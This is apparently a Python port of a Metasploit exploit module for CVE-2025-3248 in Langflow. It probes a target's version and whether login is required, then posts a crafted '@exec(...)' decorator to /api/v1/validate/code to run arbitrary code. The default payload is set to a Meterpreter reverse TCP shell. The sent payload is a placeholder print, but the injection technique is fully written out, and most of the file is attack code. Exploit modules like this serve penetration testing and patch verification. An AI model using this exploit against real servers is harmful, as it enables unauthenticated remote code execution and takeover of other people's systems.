#!/usr/bin/env python3
# -*- coding: utf-8 -*-
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

"""
Langflow AI RCE (CVE-2025-3248)

Langflow versions prior to 1.3.0 are susceptible to code injection in the 
/api/v1/validate/code endpoint. A remote and unauthenticated attacker can 
send crafted HTTP requests to execute arbitrary code.
"""

import sys
import os
import json

# Add parent directories to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../lib'))

from msf.core.exploit import Exploit, CheckCode, Failure
from msf.core.options import OptInt
from rex.text import Text

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class MetasploitModule(Exploit):
    """
    Langflow AI RCE exploit module
    """
    
    # Module ranking
    rank = Exploit.ExcellentRanking
    
    def __init__(self):
        """Initialize the exploit module"""
        super().__init__({
            'Name': 'Langflow AI RCE',
            'Description': '''
                Langflow versions prior to 1.3.0 are susceptible to code injection in the /api/v1/validate/code endpoint.
                A remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code.
            ''',
            'License': 'MSF_LICENSE',
            'Author': [
                'Naveen Sunkavally (Horizon3.ai)', # Vulnerability discovery and PoC
                'Takahiro Yokoyama',               # Metasploit module
                'GitHub Copilot'                   # Python conversion
            ],
            'References': [
                {'type': 'CVE', 'ref': '2025-3248'},
                {'type': 'URL', 'ref': 'https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/'}
            ],
            'Platform': ['python'],
            'Arch': [self.ARCH_PYTHON],
            'Targets': [
                {
                    'name': 'Python payload',
                    'Platform': 'python',
                    'Arch': self.ARCH_PYTHON,
                    'DefaultOptions': {
                        'PAYLOAD': 'python/meterpreter/reverse_tcp'
                    }
                }
            ],
            'DefaultTarget': 0,
            'Payload': {
                'BadChars': '"'
            },
            'DisclosureDate': '2025-04-09',
            'Notes': {
                'Stability': [self.CRASH_SAFE],
                'SideEffects': [self.ARTIFACTS_ON_DISK, self.IOC_IN_LOGS],
                'Reliability': [self.REPEATABLE_SESSION]
            }
        })
        
        # Register options
        self.register_options([
            OptInt('RPORT', True, 7860, 'Remote port')
        ])
        
    def version_compare(self, v1: str, v2: str) -> int:
        """
        Compare two version strings
        
        Args:
            v1: First version
            v2: Second version
            
        Returns:
            -1 if v1 < v2, 0 if equal, 1 if v1 > v2
        """
        parts1 = [int(x) for x in v1.split('.')]
        parts2 = [int(x) for x in v2.split('.')]
        
        for i in range(max(len(parts1), len(parts2))):
            p1 = parts1[i] if i < len(parts1) else 0
            p2 = parts2[i] if i < len(parts2) else 0
            if p1 < p2:
                return -1
            elif p1 > p2:
                return 1
        return 0
        
    def check(self):
        """
        Check if target is vulnerable
        
        Returns:
            CheckCode indicating vulnerability status
        """
        if not HAS_REQUESTS:
            return CheckCode.Unknown('Required dependency (requests) not available')
            
        try:
            # Check version endpoint
            uri = self.normalize_uri(self.datastore.get('TARGETURI', '/'), 'api/v1/version')
            url = f"http://{self.datastore['RHOST']}:{self.datastore['RPORT']}{uri}"
            
            res = requests.get(url, timeout=10)
            
            if res.status_code != 200:
                return CheckCode.Unknown('Unexpected server reply.')
                
            try:
                json_data = res.json()
                version = json_data.get('version')
                
                if not version:
                    return CheckCode.Unknown('Failed to parse version.')
                    
                # Check if version < 1.3.0
                if self.version_compare(version, '1.3.0') < 0:
                    return CheckCode.Appears(
                        f"Version {version} detected. Which is vulnerable even if authentication is enabled."
                    )
                    
                # Check if auto_login is enabled
                uri = self.normalize_uri(self.datastore.get('TARGETURI', '/'), 'api/v1/auto_login')
                url = f"http://{self.datastore['RHOST']}:{self.datastore['RPORT']}{uri}"
                
                res = requests.get(url, timeout=10)
                
                if res.status_code == 200:
                    return CheckCode.Appears(
                        f"Version {version} detected and authentication is disabled. Which is vulnerable."
                    )
                    
                return CheckCode.Safe(
                    f"Version {version} detected and authentication is enabled. which is not vulnerable."
                )
                
            except Exception as e:
                return CheckCode.Unknown(f'Failed to parse response: {e}')
                
        except Exception as e:
            self.print_error(f"Check failed: {e}")
            return CheckCode.Unknown(f'Error during check: {e}')
            
    def exploit(self):
        """
        Main exploit routine
        """
        if not HAS_REQUESTS:
            self.fail_with(Failure.BadConfig, 'Required dependency (requests) not installed')
            
        try:
            # Generate random function name
            rand_func = Text.rand_text_alpha(6)
            
            # Build the payload
            # In real implementation, payload.encode would return the actual payload
            payload_code = "print('Exploit successful')"  # Placeholder
            code = f'@exec("{payload_code}")\ndef {rand_func}():\n    pass'
            
            # Send exploit request
            uri = self.normalize_uri(self.datastore.get('TARGETURI', '/'), 'api/v1/validate/code')
            url = f"http://{self.datastore['RHOST']}:{self.datastore['RPORT']}{uri}"
            
            payload_data = {
                'code': code
            }
            
            headers = {
                'Content-Type': 'application/json'
            }
            
            res = requests.post(
                url,
                headers=headers,
                data=json.dumps(payload_data),
                timeout=10
            )
            
            if not res:
                self.fail_with(Failure.Unknown, 'Unexpected server reply.')
                
            if res.status_code == 200:
                self.print_good("Exploit sent successfully")
            else:
                self.print_warning(f"Unexpected status code: {res.status_code}")
                
        except Exception as e:
            self.fail_with(Failure.Unknown, f'Exploit failed: {e}')


if __name__ == '__main__':
    # Standalone execution for testing
    module = MetasploitModule()
    print(f"Module: {module.info['Name']}")
    print(f"Description: {module.info['Description']}")
    print(f"Author: {', '.join(module.info['Author'])}")
    print(f"CVE: {module.info['References'][0]['ref']}")
    print(f"\nThis is a Metasploit module and should be run through msfconsole")
